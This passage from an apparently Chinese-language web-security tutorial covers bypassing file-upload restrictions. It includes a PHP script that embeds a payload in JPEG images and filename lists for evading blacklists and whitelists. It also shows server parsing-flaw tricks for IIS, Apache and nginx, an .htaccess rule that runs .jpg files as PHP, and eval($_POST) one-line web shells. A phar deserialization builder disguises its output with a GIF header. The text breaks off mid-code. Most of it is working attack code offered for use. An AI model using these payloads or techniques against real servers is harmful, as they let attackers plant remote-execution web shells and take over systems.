&#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(&quot;custom_error_handler&quot;);</span><br><span class="line"></span><br><span class="line">    for($pad = 0; $pad &lt; 1024; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = new DataInputStream($argv[1]);</span><br><span class="line">        $outStream = file_get_contents($argv[1]);</span><br><span class="line">        $extraBytes = 0;</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line"></span><br><span class="line">        if($dis-&gt;readShort() != 0xFFD8) &#123;</span><br><span class="line">            die(&#x27;Incorrect SOI marker&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - 2;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            if($marker === 0xDA) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, 0, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE);</span><br><span class="line">                if($extraBytes !== 0) &#123;</span><br><span class="line">                    while((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        if($dis-&gt;readByte() === 0xFF) &#123;</span><br><span class="line">                            if($dis-&gt;readByte !== 0x00) &#123;</span><br><span class="line">                                break;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - 2;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, 0, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            0,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; elseif($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123;</span><br><span class="line">                    die(&#x27;Success!&#x27;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(&#x27;payload_&#x27;.$argv[1]);</span><br><span class="line">    die(&#x27;Something\&#x27;s wrong&#x27;);</span><br><span class="line"></span><br><span class="line">    function checkImage($filename, $data, $unlink = FALSE) &#123;</span><br><span class="line">        global $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        if($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        return $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">        global $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = FALSE;</span><br><span class="line">        if(preg_match(&#x27;/(\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123;</span><br><span class="line">            if(isset($m[1])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[1];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class DataInputStream &#123;</span><br><span class="line">        private $binData;</span><br><span class="line">        private $order;</span><br><span class="line">        private $size;</span><br><span class="line"></span><br><span class="line">        public function __construct($filename, $order = false, $fromString = false) &#123;</span><br><span class="line">            $this-&gt;binData = &#x27;&#x27;;</span><br><span class="line">            $this-&gt;order = $order;</span><br><span class="line">            if(!$fromString) &#123;</span><br><span class="line">                if(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;);</span><br><span class="line">                $this-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $this-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            $this-&gt;size = strlen($this-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function seek() &#123;</span><br><span class="line">            return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function skip($skip) &#123;</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readByte() &#123;</span><br><span class="line">            if($this-&gt;eof()) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr($this-&gt;binData, 0, 1);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 1);</span><br><span class="line">            return ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readShort() &#123;</span><br><span class="line">            if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr($this-&gt;binData, 0, 2);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 2);</span><br><span class="line">            if($this-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br><span class="line">            &#125;</span><br><span class="line">            return $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function eof() &#123;</span><br><span class="line">            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>使用方法</p><p>随便找一个jpg图片,下载到本地保存为<code>1.jpg</code>.</p><p>使用脚本处理<code>1.jpg</code>,命令<code>php jpg_payload.php 1.jpg</code></p><p><img src="image-20210212221838208.png" alt="image-20210212221838208"></p><p>使用16进制编辑器打开,就可以看到插入的php代码.</p><p><img src="image-20210212221823008.png" alt="image-20210212221823008"></p><p>需要注意的是,有一些jpg图片不能被处理,所以要多尝试一些jpg图片.</p><h3 id="4-后缀校验"><a href="#4-后缀校验" class="headerlink" title="4.后缀校验"></a>4.后缀校验</h3><p><strong>原理</strong></p><p>取文件后缀名与服务端黑白名单进行比较</p><p><strong>绕过</strong></p><p>os系统特性、后缀名截取不规范、php代码缺陷、过滤不完全、配合伪协议解析图形文件</p><h4 id="1-黑名单绕过"><a href="#1-黑名单绕过" class="headerlink" title="1.黑名单绕过"></a>1.黑名单绕过</h4><p>windows下绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">更换.htaccess偏门文件名和后缀名</span><br><span class="line">扩展名末尾添加空格、&#x27;_&#x27;、&#x27;.&#x27;、&#x27;::$DATA&#x27;、大小写混写(linux下也可)、‘/’、‘.’、‘/.’符号绕过</span><br><span class="line">&#x27;*=.&#x27;、&#x27;&lt;=*&#x27;、&#x27;&gt;=?&#x27;、&#x27;test.&lt;&lt;&lt;&#x27;</span><br><span class="line">test.php:1.jpg会生成一个test.php的空文件</span><br><span class="line">不可绕过考虑phar://协议利用，若过滤配合(compress://)</span><br></pre></td></tr></table></figure><p>asp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">解析漏洞:</span><br><span class="line">.asp;.jpg</span><br><span class="line">.asp.jpg</span><br><span class="line">.asp;jpg</span><br><span class="line">+111.asp;+222.jpg</span><br><span class="line">/111.asp/1.jpg</span><br><span class="line">/111.aspx/1.jpg</span><br><span class="line">后缀名：</span><br><span class="line">asa,cer,cdx,ashx,asmx,xml,htr,asax</span><br><span class="line">双文件扩展：</span><br><span class="line">test.asp.jpg</span><br><span class="line">RTLO：</span><br><span class="line">asp.html-内容为一句话</span><br><span class="line">php.txt-内容为一句话</span><br></pre></td></tr></table></figure><p>jsp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.jsp.jpg.jsp#用两个jsp包围中间的jpg</span><br><span class="line">后缀名：jspf,jspa,jsps,jspx</span><br></pre></td></tr></table></figure><p>php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">后缀名：.php3 ,.php4,.php5,.php7</span><br><span class="line">大小写：pHp</span><br><span class="line">解析漏洞：</span><br><span class="line">1.php.jpg</span><br><span class="line">1.jpg.php</span><br><span class="line">1.php  jpg(jpg前面两个空格)</span><br><span class="line">1.php jpg(jpg前面一个空格)</span><br><span class="line">/1.jpg/1.php</span><br><span class="line">/1.jpg%00.php</span><br><span class="line">/1.jpg/.php</span><br><span class="line">/1.jpg/php</span><br><span class="line">特殊文件利用：</span><br><span class="line">.htaccess</span><br><span class="line">.user.ini</span><br></pre></td></tr></table></figure><p>以上一些脚本语言的解析漏洞再白名单中也实用</p><h5 id="htaccess（白名单也可）"><a href="#htaccess（白名单也可）" class="headerlink" title=".htaccess（白名单也可）"></a>.htaccess（白名单也可）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.htaccess文件(或者&quot;分布式配置文件&quot;）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</span><br></pre></td></tr></table></figure><p>利用.htaccess的条件：Apache中配置<code>AllowOverride All</code></p><p>.htaccess文件可以配置将特定的文件按规定的文件类型进行解析，可以用以下两种方式来配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;test&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>这一种采用正则匹配，只要文件名为test的文件都将被作为php文件解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>第二种是将.jpg文件都作为php文件解析</p><p>这样我们如果能将.htaccess上传到服务器的话，就可以再根据我们自己设定的规则来解析上传的文件，以此来绕过上传过滤</p><h5 id="利用工具进行fuzz"><a href="#利用工具进行fuzz" class="headerlink" title="利用工具进行fuzz"></a>利用工具进行fuzz</h5><p>工具：<a href="https://github.com/c0ny1/upload-fuzz-dic-builder">https://github.com/c0ny1/upload-fuzz-dic-builder</a> </p><p>生成fuzz的字典,执行命令:<code>python upload-fuzz-dic-builder.py -n test -a jpg -l php -m apache --os win -o upload_file.txt</code></p><p>把生成的字典导入burp中，同时取消payload-encoding的选中状态。执行后可以看到有些php文件上传成功。然后访问其中上传成功的文件，查看是否执行。</p><p><img src="image-20210212222524169.png" alt="image-20210212222524169"></p><p>访问如图中的地址文件，可以看到上传成功：</p><p><img src="image-20210212222545092.png" alt="image-20210212222545092"></p><h4 id="2-白名单绕过"><a href="#2-白名单绕过" class="headerlink" title="2.白名单绕过"></a>2.白名单绕过</h4><h5 id="1-00解析漏洞"><a href="#1-00解析漏洞" class="headerlink" title="1.00解析漏洞"></a>1.00解析漏洞</h5><p>这个多数被利用在截断路径，利用的条件是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP &lt; 5.3.4</span><br><span class="line">magic_quotes_gpc 关闭</span><br></pre></td></tr></table></figure><p>因为<code>0x00</code>是字符串的结束标志符，所以php在读取到<code>0x00</code>时就不会再往后读取，我们可以利用这些截断字符后面不需要的内容</p><p>注意的是<code>%00</code>是url编码，在以POST传参时应该使用burpsuite对其进行url decode，或者修改hex值为00；而当GET传参时因为浏览器会做一遍url decode，所以直接传<code>%00</code>即可。例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.php%00.jpg,shell.php0xoo.jpg</span><br></pre></td></tr></table></figure><h5 id="2-ascii-特殊字符包含"><a href="#2-ascii-特殊字符包含" class="headerlink" title="2.ascii 特殊字符包含"></a>2.ascii 特殊字符包含</h5><p>00 截断无效，尝试用 0x00~0xff 之内的 ascii 字符来截断。</p><p>burp 中发送数据包到 intruder 模块，将范围控制在 0~255 之间</p><p>用 intuder 模块的 payload 进行处理，先加上 % ，再进行 urldecode</p><p><img src="image-20210214015052201.png" alt="image-20210214015052201"></p><h5 id="3-webserver解析漏洞"><a href="#3-webserver解析漏洞" class="headerlink" title="3.webserver解析漏洞"></a>3.webserver解析漏洞</h5><p><strong>IIS</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IIS5.x-6.x:</span><br><span class="line">1、目录解析(6.0):/1.asp/1.jpg 在1.asp下的任意文件，服务器都解析为asp文件</span><br><span class="line">2、文件解析:1.asp;.jpg#分号后面的不被解析，也就是说1.asp;.jpg会被服务器看成是1.asp</span><br><span class="line">3、文件类型:1.asa,a.cer,1.cdx</span><br><span class="line">IIS7.5：IIS7.5是由于php配置文件中，开启了cgi.fix_pathinf，当访问：http://test.com/a.jpg时，a.jpg会被当做php执行。</span><br></pre></td></tr></table></figure><p>Windows下图片马制作：<code>copy /b 正常图片.jpg + yijuhua.php yijuhua.jpg</code></p><p><strong>低版本apache解析漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Apache和php三种结合方式：CGI、Module、FastCGI，该解析漏洞只有在apache和php以Module方式结合时才存在，而且Apache还有一个特性：从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断</span><br><span class="line">后缀不识别：1.php.php123，而左边的php可识别，就会被解析为php文件</span><br><span class="line">配置错误：1.php.jpg</span><br></pre></td></tr></table></figure><p><strong>CVE-2017-15715</strong></p><p>一个apache的解析漏洞就是CVE-2017-15715，这个漏洞利用方式就是上传一个文件名最后带有换行符(只能是<code>\x0A</code>，如上传a.php，然后在burp中修改文件名为<code>a.php\x0A</code>)，以此来绕过一些黑名单过滤</p><p>具体的漏洞分析可以看p牛：<a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html">https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</a></p><p><strong>nginx解析漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Nginx默认是以CGI的方式支持PHP解析的，和IIS7.5一样开启了cgi.fix_pathinf</span><br><span class="line">1.jpg/1.php</span><br><span class="line">1.jpg%00.php</span><br><span class="line">1.jpg/%20\1.php</span><br><span class="line">上传一个名字为test.jpg，以下内容的文件：‘);?&gt;  然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php</span><br><span class="line">Nginx &lt;8.03</span><br><span class="line">默认Fast-CGI开启状况下，上传一个木马文件为xxx.jpg，然后访问xxx.jpg/x.php，这个文件将以php进行解析</span><br><span class="line">Nginx 0.5.,0.6, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37</span><br><span class="line">Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码</span><br></pre></td></tr></table></figure><h4 id="3-文件包含"><a href="#3-文件包含" class="headerlink" title="3.文件包含"></a>3.文件包含</h4><p>利用条件：无法直接上传 shell，只能上传图片，存在文件包含</p><h5 id="1-phar"><a href="#1-phar" class="headerlink" title="1.phar"></a>1.phar</h5><p>phar 是 php 中的一种归档压缩文件，类似 zip 。可以使用 phar:&#x2F;&#x2F; 协议来访问压缩后的文件。</p><p>PHP5.3之后支持了类似Java的jar包，名为phar。用来将多个PHP文件打包为一个文件。</p><p><strong>文件结构</strong></p><p>1.a stub：可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><p>2.a manifest describing the contents：phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p><p>3.the file contents：被压缩文件的内容。</p><p>4.[optional] a signature for verifying Phar integrity (phar file format only)：签名，放在文件末尾</p><h6 id="1-正常使用"><a href="#1-正常使用" class="headerlink" title="1.正常使用"></a>1.正常使用</h6><p>将 php 文件压缩成 zip 文件，zip 文件改后缀为相应的上传点要求文件后缀</p><p>例如上传点要求png，将下面的代码放在 1.php 中，压缩成 1.zip 并改名 1.png后上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>上传文件之后在右键 -&gt; 源代码中可以看到上传的地址，复制出来并用 phar:&#x2F;&#x2F; 协议进行访问</p><p>访问：<code>path/x.php?str=phar://upload_path/1.png</code></p><h6 id="2-phar反序列化"><a href="#2-phar反序列化" class="headerlink" title="2.phar反序列化"></a>2.phar反序列化</h6><p><strong>原因</strong></p><p>phar反序列化漏洞的漏洞点在于使用phar:&#x2F;&#x2F;协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Metadata信息会被反序列化；当Metadata内容可由用户控制，则会存在反序列化漏洞风险。</p><p><strong>生成一个简单的phar</strong></p><p>php内置了一个Phar类来处理相关操作，但是要将php.ini中的<code>phar.readonly</code>选项设置为<code>Off</code>，否则无法生成phar文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span> -&gt; data);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$o</span> -&gt; data = <span class="string">&#x27;phpinfo();&#x27;</span>; <span class="comment">//恶意内容</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>利用条件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.phar文件要能够上传到服务器端。</span><br><span class="line">2.要有可用的魔术方法作为“跳板”。</span><br><span class="line">3.文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</span><br></pre></td></tr></table></figure><p><strong>简单的例子</strong></p><p>假定上传点只能上传GIF，则对<strong>生成一个简单的phar</strong>中做一个简单的修改</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="comment">//stub前面添加gif头，绕过文件幻数检测</span></span><br></pre></td></tr></table></figure><p>后台解析文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span> -&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure><p>然后执行我们的马生成test.phar文件，改后缀为gif，上传。</p><p>访问：<code>path/x.php?str=phar://upload_path/test.gif</code>即可</p><h5 id="2-php自包含特性"><a href="#2-php自包含特性" class="headerlink" title="2.php自包含特性"></a>2.php自包含特性</h5><p><strong>利用条件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 可控的文件包含点。</span><br><span class="line">2. 目录遍历漏洞。（查看临时文件名）</span><br></pre></td></tr></table></figure><p><strong>php文件上传机制</strong></p><p>首先先了解一下php的全局数组$_FILES。</p><p>官方的解释：</p><blockquote><p>通过 HTTP POST 方式上传到当前脚本的项目的数组。通过使用 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。</p></blockquote><p>$_FILES 数组提供了多个内容在文件上传时使用，比较重要的有以下几个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;name&#x27;] 客户端文件的原名称。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。</span><br></pre></td></tr></table></figure><ul><li>这里的重点就是<code>$_FILES[‘myFile’] [‘tmp_name’]</code>这个变量</li></ul><p>上传过程中还利用到了一个重要的函数move_uploaded_file()，该方法是将上传的文件移动到新位置，若不加上这一行代码，临时文件在上传周期后就被删除而不会被存储。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(file,newloc)</span><br></pre></td></tr></table></figure><blockquote><p>本函数检查并确保由 file 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。</p></blockquote><p><strong>利用点</strong></p><p>在同一目录下创建两个文件，file_upload.html和upload.php</p><ul><li><p>file_upload.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/formdata&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lable</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">lable</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload_file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;subit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传前的文件名: &quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>].<span class="string">&#x27;&lt;/&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传的临时文件名 : &quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span 